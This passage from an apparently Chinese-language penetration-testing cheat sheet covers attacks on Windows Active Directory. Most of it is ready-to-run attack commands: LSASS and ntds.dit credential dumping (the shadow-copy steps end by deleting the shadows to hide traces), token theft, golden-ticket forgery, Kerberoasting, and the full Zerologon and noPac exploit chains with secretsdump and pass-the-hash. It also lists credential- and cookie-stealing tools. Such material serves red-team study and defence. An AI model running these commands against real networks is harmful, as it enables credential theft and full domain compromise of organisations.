class="code"><pre><span class="line">PPLdump64.exe &lt;lsass.exe|lsass_pid&gt; lsass.dmp</span><br><span class="line"></span><br><span class="line">mimikatz &quot;!+&quot; &quot;!processprotect &#x2F;process:lsass.exe &#x2F;remove&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot;  &quot;sekurlsa::logonpasswords&quot; &quot;!processprotect  &#x2F;process:lsass.exe&quot; &quot;!-&quot; #with mimidriver.sys </span><br></pre></td></tr></table></figure><h3 id="token窃取"><a href="#token窃取" class="headerlink" title="token窃取"></a>token窃取</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.\incognito.exe list_tokens -u</span><br><span class="line">.\incognito.exe execute -c &quot;&lt;domain&gt;\&lt;user&gt;&quot; powershell.exe</span><br><span class="line"></span><br><span class="line">use incognito</span><br><span class="line">impersonate_token &lt;domain&gt;\\&lt;user&gt;</span><br></pre></td></tr></table></figure><p>之前粗略分析过 token</p><p><a href="https://0range-x.github.io/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/">Token窃取那些事 (0range-x.github.io)</a></p><h3 id="查看本地存储的所有密码"><a href="#查看本地存储的所有密码" class="headerlink" title="查看本地存储的所有密码"></a>查看本地存储的所有密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lazagne.exe all</span><br></pre></td></tr></table></figure><h3 id="卷影拷贝（获取域控所有hash）"><a href="#卷影拷贝（获取域控所有hash）" class="headerlink" title="卷影拷贝（获取域控所有hash）"></a>卷影拷贝（获取域控所有hash）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">diskshadow list shadows all</span><br><span class="line"></span><br><span class="line">mklink &#x2F;d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">管理员权限执行 </span><br><span class="line">vssadmin create shadow &#x2F;for&#x3D;C: </span><br><span class="line">利用卷影副本卷名拷贝ntds.dit文件与用注册表导出system.hive </span><br><span class="line"></span><br><span class="line">copy \\?\GLOBALLROOT\Device\xxxxxxxxxx\windows\ntds\ntds.dit C:\ntds.dit reg sava hklm\system system.hive </span><br><span class="line">&#x2F;&#x2F;导出system.hive文件到注册表 </span><br><span class="line"></span><br><span class="line">vssadmin delete shadows &#x2F;for&#x3D;C: &#x2F;quiet   &#x2F;&#x2F;删除卷影，隐藏痕迹</span><br></pre></td></tr></table></figure><p><a href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/"><a href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/#vssadmin%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D">CVE-2020-1472的分析与复现 (0range-x.github.io)</a></a></p><h3 id="dpapi解密"><a href="#dpapi解密" class="headerlink" title="dpapi解密"></a>dpapi解密</h3><h1 id="2-内网信息收集"><a href="#2-内网信息收集" class="headerlink" title="2.内网信息收集"></a>2.内网信息收集</h1><h2 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1、用户列表  net user &#x2F;domain</span><br><span class="line">windows用户列表 分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户</span><br><span class="line"></span><br><span class="line">2.进程列表  tasklist &#x2F;svc</span><br><span class="line">分析杀毒软件&#x2F;安全监控工具等 邮件客户端 VPN ftp等</span><br><span class="line"></span><br><span class="line">3.服务列表tasklist &#x2F;svc</span><br><span class="line">与安全防范工具有关服务[判断是否可以手动开关等] 存在问题的服务[权限&#x2F;漏洞]</span><br><span class="line"></span><br><span class="line">4.端口列表netstat -ano</span><br><span class="line">开放端口对应的常见服务&#x2F;应用程序[匿名&#x2F;权限&#x2F;漏洞等] 利用端口进行信息收集</span><br><span class="line"></span><br><span class="line">5.补丁列表systeminfo</span><br><span class="line">分析 Windows 补丁 第三方软件[Java&#x2F;Oracle&#x2F;Flash 等]漏洞</span><br><span class="line"></span><br><span class="line">6.本机共享smbclient -L ip  </span><br><span class="line">   net user \\ip\c$</span><br><span class="line">本机共享列表&#x2F;访问权限 本机访问的域共享&#x2F;访问权限</span><br><span class="line"></span><br><span class="line">7.本用户习惯分析</span><br><span class="line">历史记录 收藏夹 文档等</span><br></pre></td></tr></table></figure><h3 id="8-获取当前用户密码"><a href="#8-获取当前用户密码" class="headerlink" title="8.获取当前用户密码"></a>8.获取当前用户密码</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><ul><li><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></li><li><a href="https://github.com/peewpw/Invoke-WCMDump">Invoke-WCMDump</a></li><li><a href="https://github.com/giMini/mimiDbg">mimiDbg</a></li><li><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></li><li><a href="http://launcher.nirsoft.net/downloads/">NirLauncher )</a></li><li><a href="https://github.com/quarkslab/quarkspwdump">quarkspwdump</a></li></ul><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><ul><li><a href="https://github.com/huntergregal/mimipenguin">mimipenguin</a></li><li><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></li></ul><h4 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h4><ul><li><a href="https://github.com/moonD4rk/HackBrowserData">HackBrowserData</a></li><li><a href="https://github.com/djhohnstein/SharpWeb">SharpWeb</a></li><li><a href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a></li><li><a href="https://github.com/hayasec/360SafeBrowsergetpass">360SafeBrowsergetpass</a></li><li><a href="https://github.com/QAX-A-Team/BrowserGhost/">BrowserGhost</a></li><li><a href="https://github.com/DeEpinGh0st/Browser-cookie-steal">Browser-cookie-steal(窃取浏览器cookie)</a></li></ul><h4 id="Navicat密码"><a href="#Navicat密码" class="headerlink" title="Navicat密码"></a>Navicat密码</h4><p>版本：Navicat 11或12</p><p>方法：<a href="https://blog.csdn.net/CCESARE/article/details/104746596">https://blog.csdn.net/CCESARE/article/details/104746596</a></p><p>解密脚本：<a href="https://github.com/tianhe1986/FatSmallTools">https://github.com/tianhe1986/FatSmallTools</a></p><p><a href="https://github.com/HyperSine/how-does-navicat-encrypt-password">https://github.com/HyperSine/how-does-navicat-encrypt-password</a></p><h4 id="xshell-amp-xftp密码"><a href="#xshell-amp-xftp密码" class="headerlink" title="xshell&amp;xftp密码"></a>xshell&amp;xftp密码</h4><p><a href="https://github.com/dzxs/Xdecrypt">https://github.com/dzxs/Xdecrypt</a></p><h4 id="mRemoteNG密码"><a href="#mRemoteNG密码" class="headerlink" title="mRemoteNG密码"></a>mRemoteNG密码</h4><p><a href="https://github.com/kmahyyg/mremoteng-decrypt">https://github.com/kmahyyg/mremoteng-decrypt</a></p><p><a href="https://github.com/haseebT/mRemoteNG-Decrypt">https://github.com/haseebT/mRemoteNG-Decrypt</a></p><h2 id="扩散信息收集"><a href="#扩散信息收集" class="headerlink" title="扩散信息收集"></a>扩散信息收集</h2><h3 id="常用端口扫描工具"><a href="#常用端口扫描工具" class="headerlink" title="常用端口扫描工具"></a>常用端口扫描工具</h3><ul><li>nmap</li><li>masscan</li><li>zmap</li><li>s扫描器</li><li>自写脚本</li><li>nc</li></ul><h3 id="内网拓扑架构分析"><a href="#内网拓扑架构分析" class="headerlink" title="内网拓扑架构分析"></a>内网拓扑架构分析</h3><ul><li>DMZ</li><li>管理网</li><li>生产网</li><li>测试网</li></ul><h3 id="常见信息收集命令"><a href="#常见信息收集命令" class="headerlink" title="常见信息收集命令"></a>常见信息收集命令</h3><p>ipconfig</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all ------&gt; 查询本机 IP 段，所在域等</span><br></pre></td></tr></table></figure><p>net</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net user ------&gt; 本机用户列表</span><br><span class="line">net localgroup administrators ------&gt; 本机管理员[通常含有域用户]</span><br><span class="line">net user &#x2F;domain ------&gt; 查询域用户</span><br><span class="line">net group &#x2F;domain ------&gt; 查询域里面的工作组</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain ------&gt; 查询域管理员用户组</span><br><span class="line">net localgroup administrators &#x2F;domain ------&gt; 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 &#x2F;add -----&gt;域用户添加到本机 net group &quot;Domain controllers&quot; -------&gt; 查看域控制器(如果有多台)</span><br><span class="line">net view ------&gt; 查询同一域内机器列表 net view &#x2F;domain ------&gt; 查询域列表</span><br><span class="line">net view &#x2F;domain:domainname</span><br></pre></td></tr></table></figure><p>dsquery</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer domainroot -limit 65535 &amp;&amp; net group &quot;domain</span><br><span class="line">computers&quot; &#x2F;domain ------&gt; 列出该域内所有机器名</span><br><span class="line">dsquery user domainroot -limit 65535 &amp;&amp; net user &#x2F;domain------&gt;列出该域内所有用户名</span><br><span class="line">dsquery subnet ------&gt;列出该域内网段划分</span><br><span class="line">dsquery group &amp;&amp; net group &#x2F;domain ------&gt;列出该域内分组 </span><br><span class="line">dsquery ou ------&gt;列出该域内组织单位 </span><br><span class="line">dsquery server &amp;&amp; net time &#x2F;domain------&gt;列出该域内域控制器 </span><br></pre></td></tr></table></figure><h3 id="第三方信息收集"><a href="#第三方信息收集" class="headerlink" title="第三方信息收集"></a>第三方信息收集</h3><ul><li>NETBIOS 信息收集</li><li>SMB 信息收集</li><li>空会话信息收集</li><li>漏洞信息收集等</li></ul><h1 id="3-获取域控的方法"><a href="#3-获取域控的方法" class="headerlink" title="3.获取域控的方法"></a>3.获取域控的方法</h1><h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><p>SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。 相关阅读:</p><ul><li><a href="http://www.freebuf.com/vuls/92016.html">寻找SYSVOL里的密码和攻击GPP（组策略偏好）</a></li><li><a href="http://blog.51cto.com/ycrsjxy/203095">Windows Server 2008 R2之四管理Sysvol文件夹</a></li><li><a href="https://adsecurity.org/?p=2288">SYSVOL中查找密码并利用组策略首选项</a></li><li><a href="https://xz.aliyun.com/t/1653">利用SYSVOL还原组策略中保存的密码</a></li></ul><h5 id="MS14-068-Kerberos"><a href="#MS14-068-Kerberos" class="headerlink" title="MS14-068 Kerberos"></a>MS14-068 Kerberos</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机</span><br></pre></td></tr></table></figure><p>利用mimikatz将工具得到的<a href="mailto:TGT_domainuser@SERVER.COM.ccache">TGT_domainuser@SERVER.COM.ccache</a>写入内存，创建缓存证书：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc c:TGT_darthsidious@pentest.com.ccache&quot; exit</span><br><span class="line">net use k: \pentest.comc$</span><br></pre></td></tr></table></figure><p>相关阅读 :</p><ul><li><a href="http://adsecurity.org/?p=676">Kerberos的工具包PyKEK</a></li><li><a href="http://www.freebuf.com/vuls/56081.html">深入解读MS14-068漏洞</a></li><li><a href="https://adsecurity.org/?p=541">Kerberos的安全漏洞</a></li></ul><h5 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h5><p>Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。 SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内部帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册SPN。 SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。 相关阅读 :</p><ul><li><a href="https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning/">非扫描式的SQL Server发现</a></li><li><a href="https://adsecurity.org/?p=1508">SPN扫描</a></li><li><a href="https://github.com/PyroTek3/PowerShell-AD-Recon">扫描SQLServer的脚本</a></li></ul><h5 id="Kerberos的黄金门票"><a href="#Kerberos的黄金门票" class="headerlink" title="Kerberos的黄金门票"></a>Kerberos的黄金门票</h5><p>在域上抓取的哈希</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:pentest.com &#x2F;user:krbtgt</span><br><span class="line"></span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">kerberos::golden &#x2F;admin:administrator &#x2F;domain:域 &#x2F;sid:SID &#x2F;krbtgt:hash值 </span><br><span class="line">&#x2F;ticket:adinistrator.kiribi</span><br><span class="line"></span><br><span class="line">kerberos::ptt administrator.kiribi</span><br><span class="line"></span><br><span class="line">kerberos::tgt</span><br><span class="line"></span><br><span class="line">net use k: \pnet use k: \pentest.comc$</span><br></pre></td></tr></table></figure><p>相关阅读 :</p><ul><li><a href="https://adsecurity.org/?p=1640">https://adsecurity.org/?p=1640</a></li><li><a href="http://bobao.360.cn/learning/detail/3564.html">域服务账号破解实践</a></li><li><a href="https://blog.csdn.net/wulantian/article/details/42418231">Kerberos的认证原理</a></li><li><a href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/">深刻理解windows安全认证机制ntlm＆Kerberos</a></li></ul><h5 id="Kerberos的银票务"><a href="#Kerberos的银票务" class="headerlink" title="Kerberos的银票务"></a>Kerberos的银票务</h5><p>黄金票据和白银票据的一些区别： Golden Ticket：伪造<code>TGT</code>，可以获取<code>任何Kerberos</code>服务权限 银票：伪造TGS，<code>只能访问指定的服务</code> 加密方式不同： Golden Ticket由<code>krbtgt</code>的hash加密 Silver Ticket由<code>服务账号</code>（通常为计算机账户）Hash加密 认证流程不同： 金票在使用的过程需要同域控通信 银票在使用的过程不需要同域控通信 相关阅读 :</p><ul><li><a href="https://adsecurity.org/?p=2011">攻击者如何使用Kerberos的银票来利用系统</a></li><li>[域渗透——Pass The Ticket](<a href="https://www.feiworks.com/wy/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass">https://www.feiworks.com/wy/drops/域渗透——Pass</a> The Ticket.pdf)</li></ul><h5 id="域服务账号破解"><a href="#域服务账号破解" class="headerlink" title="域服务账号破解"></a>域服务账号破解</h5><p>与上面SPN扫描类似的原理 <a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a> 获取所有用作SPN的帐户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T PENTEST.com -Q *&#x2F;*</span><br></pre></td></tr></table></figure><p>从Mimikatz的RAM中提取获得的门票</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list &#x2F;export</span><br></pre></td></tr></table></figure><p>用rgsrepcrack破解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi</span><br></pre></td></tr></table></figure><h5 id="凭证盗窃"><a href="#凭证盗窃" class="headerlink" title="凭证盗窃"></a>凭证盗窃</h5><p>从搜集的密码里面找管理员的密码</p><h5 id="NTLM-relay"><a href="#NTLM-relay" class="headerlink" title="NTLM relay"></a>NTLM relay</h5><ul><li><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">One API call away from Domain Admin</a></li><li><a href="https://github.com/dirkjanm/privexchange/">privexchange</a></li><li><a href="https://github.com/ridter/exchange2domain">Exchange2domain</a></li></ul><p>用于主动让目标机器发起NTLM请求的方法：</p><ul><li><a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py">printerbug</a></li><li><a href="https://github.com/topotam/PetitPotam">PetitPotam</a></li></ul><p>Relay LDAP:</p><ul><li><a href="https://github.com/Ridter/CVE-2019-1040-dcpwn">CVE-2019-1040-dcpwn</a></li></ul><p>Relay AD CS/PKI:</p><ul><li><a href="https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/">AD CS/PKI template exploit</a></li></ul><p>集成几个利用的工具：</p><ul><li><a href="https://github.com/Ridter/Relayx">Relayx</a></li></ul><p>内网445端口转发：</p><ul><li><a href="https://github.com/praetorian-inc/PortBender">PortBender</a></li></ul><h5 id="Kerberos委派"><a href="#Kerberos委派" class="headerlink" title="Kerberos委派"></a>Kerberos委派</h5><ul><li><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging-the-Dog.html</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/">s4u2pwnage</a></li><li><a href="https://xz.aliyun.com/t/2931">Attacking Kerberos Delegation</a></li><li><a href="https://adsecurity.org/?p=4056">用打印服务获取域控</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/">Computer Takeover</a></li><li><a href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">Combining NTLM Relaying and Kerberos delegation</a></li><li><a href="https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/">CVE-2019-1040</a></li></ul><h5 id="地址解析协议"><a href="#地址解析协议" class="headerlink" title="地址解析协议"></a>地址解析协议</h5><p>实在搞不定再搞ARP</p><h5 id="zerologon漏洞"><a href="#zerologon漏洞" class="headerlink" title="zerologon漏洞"></a>zerologon漏洞</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py &lt;MACHINE_BIOS_NAME&gt; &lt;ip&gt;</span><br><span class="line"></span><br><span class="line">secretsdump.py &lt;DOMAIN&gt;&#x2F;&lt;MACHINE_BIOS_NAME&gt;\$@&lt;IP&gt; -no-pass -just-dc-user &quot;Administrator&quot; </span><br><span class="line"></span><br><span class="line">secretsdump.py -hashes :&lt;HASH_admin&gt; &lt;DOMAIN&gt;&#x2F;Administrator@&lt;IP&gt;</span><br><span class="line"></span><br><span class="line">python3 restorepassword.py -target-ip &lt;IP&gt; &lt;DOMAIN&gt;&#x2F;&lt;MACHINE_BIOS_NAME&gt;@&lt;MACHINE_BIOS_NAME&gt; -hexpass &lt;HEXPASS&gt;</span><br></pre></td></tr></table></figure><p><a href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/">CVE-2020-1472的分析与复现 (0range-x.github.io)</a></p><p>**1、利用Mimikatz **check</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon &#x2F;target:dc1.exploit.local &#x2F;account:dc1$</span><br></pre></td></tr></table></figure><p><strong>exploit</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon &#x2F;target:dc1.exploit.local &#x2F;account:dc1$ &#x2F;exploit</span><br></pre></td></tr></table></figure><p><strong>dcsync</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;dc:dc1.exploit.local &#x2F;authuser:dc1$ &#x2F;authdomain:exploit.local &#x2F;authpassword:&quot;&quot; &#x2F;domain:exploit.local &#x2F;authntlm &#x2F;user:krbtgt</span><br></pre></td></tr></table></figure><p><strong>restore</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::postzerologon &#x2F;target:conttosson.locl &#x2F;account:dc$ </span><br></pre></td></tr></table></figure><p><strong>2、利用impacket：</strong></p><ul><li>取目标主机名+IP</li><li>install 修改版本的impacket</li><li>Exp</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cve-2020-1472-exploit.py DC2008 10.211.55.200</span><br></pre></td></tr></table></figure><p><a href="https://camo.githubusercontent.com/ab6ebf37bf1f547e4dd044b0ffb16f8493190a988f350bc7119c5c335b7c95be/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303133372e706e67"><img src="https://camo.githubusercontent.com/ab6ebf37bf1f547e4dd044b0ffb16f8493190a988f350bc7119c5c335b7c95be/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303133372e706e67" alt="img"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -no-<span class="keyword">pass</span> cgdomain.com/<span class="string">&#x27;DC2008$&#x27;</span>@<span class="number">10.211</span><span class="number">.55</span><span class="number">.200</span> -history -just-dc-user administrator</span><br><span class="line">secretsdump.py -no-<span class="keyword">pass</span> cgdomain.com/administrator@<span class="number">10.211</span><span class="number">.55</span><span class="number">.200</span> -hashes aad3b435b51404eeaad3b435b51404ee:3add1560657a19b3166247eb3eb149ae</span><br></pre></td></tr></table></figure><p><a href="https://camo.githubusercontent.com/d94bd9f15fb2db6a2b99b7463de0674117fb227d731c7d0d8526ee66bb66961d/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303335392e706e67"><img src="https://camo.githubusercontent.com/d94bd9f15fb2db6a2b99b7463de0674117fb227d731c7d0d8526ee66bb66961d/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303335392e706e67" alt="img"></a></p><p>获取到旧的密码明文hex，还原</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python restorepassword.py cgdomain.com&#x2F;DC2008@DC2008 -target-ip 10.211.55.200 -hexpass 59958639cbdd4523de5d42b01adb0e256e0d39aef14c8eef31f4c078862109f253bbb7b3817ab123d013856c028fa4993f5f5b9a830a3a98d87483b29df3fb55082a1f464b19220a2c04f6605d2d321a04afbb551f8f19a13d399f9f5af2aa23c5b76b49001033516fefd90cb0348256e8282b22cbf9e70d82a8b8d2916d578246e288af3af727533d36ad8950fe1c513771377d98a947c4a8eae2b581a74b6687a2e533b7e89e8d03c2e6c2123d519489869a6e33d3a8884be33107060b62e2852502261f48c097ddb68750cc55b7688cc951441cf02989a307f55c008e978edbaf31766d17b53505016c7580cb480b</span><br></pre></td></tr></table></figure><p><a href="https://camo.githubusercontent.com/206012e6d64974e4fda0704c8f1334e777a44f37f7b517e7d8776fbb79921e3f/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303435372e706e67"><img src="https://camo.githubusercontent.com/206012e6d64974e4fda0704c8f1334e777a44f37f7b517e7d8776fbb79921e3f/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303435372e706e67" alt="img"></a></p><p>恢复方法2</p><p> 通过wmic, pass the hash 拿到域控制器中的本地管理员权限(域管)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8adfc85c3490040e942ae1e6c68f645e test.local&#x2F;Administrator@10.211.55.38</span><br></pre></td></tr></table></figure><p>然后分别执行,拷贝本机中SAM数据库到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- reg save HKLM\SYSTEM system.save</span><br><span class="line">- reg save HKLM\SAM sam.save</span><br><span class="line">- reg save HKLM\SECURITY security.save</span><br><span class="line">- get system.save</span><br><span class="line">- get sam.save</span><br><span class="line">- get security.save</span><br><span class="line">- del &#x2F;f system.save</span><br><span class="line">- del &#x2F;f sam.save</span><br><span class="line">- del &#x2F;f security.save</span><br></pre></td></tr></table></figure><p>提取明文hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure><p>然后恢复。</p><h5 id="CVE-2021-42278-amp-amp-CVE-2021-42287"><a href="#CVE-2021-42278-amp-amp-CVE-2021-42287" class="headerlink" title="CVE-2021-42278 &amp;&amp; CVE-2021-42287"></a>CVE-2021-42278 &amp;&amp; CVE-2021-42287</h5><p><a href="https://github.com/WazeHell/sam-the-admin">sam-the-admin</a></p><p><a href="https://github.com/cube0x0/noPac">noPac: CVE-2021-42287/CVE-2021-42278</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;noPac.exe -domain dc.com -user username -pass &#39;password&#39; &#x2F;dc owa.dc.com</span><br><span class="line">&#x2F;mAccount mAusername &#x2F;mPassword password &#x2F;service cifs &#x2F;ptt</span><br></pre></td></tr></table></figure><h1 id="4-列出可匿名访问的SMB共享"><a href="#4-列出可匿名访问的SMB共享" class="headerlink" title="4.列出可匿名访问的SMB共享"></a>4.列出可匿名访问的SMB共享</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;dc-ip&gt; &amp;&amp; enum4linux -a -u &quot;guest&quot; -p &quot;&quot; &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">smbmap -u &quot;&quot; -p &quot;&quot; -P 445 -H &lt;dc-ip&gt; &amp;&amp; smbmap -u &quot;guest&quot; -p &quot;&quot; -P 445 -H &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">smbclient -U &#39;%&#39; -L &#x2F;&#x2F;&lt;dc-ip&gt; &amp;&amp; smbclient -U &#39;guest%&#39; -L &#x2F;&#x2F;&lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">cme smb &lt;ip&gt; -u &#39;&#39; -p &#39;&#39; # 枚举可空Session访问的SMB共享</span><br><span class="line"></span><br><span class="line">cme smb &lt;ip&gt; -u &#39;a&#39; -p &#39;&#39; #枚举可匿名访问的SMB共享</span><br></pre></td></tr></table></figure><h1 id="5-枚举LDAP"><a href="#5-枚举LDAP" class="headerlink" title="5.枚举LDAP"></a>5.枚举LDAP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -sV --script &quot;ldap* and not brute&quot; -p 389 &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">ldapsearch -x -h &lt;ip&gt; -s base  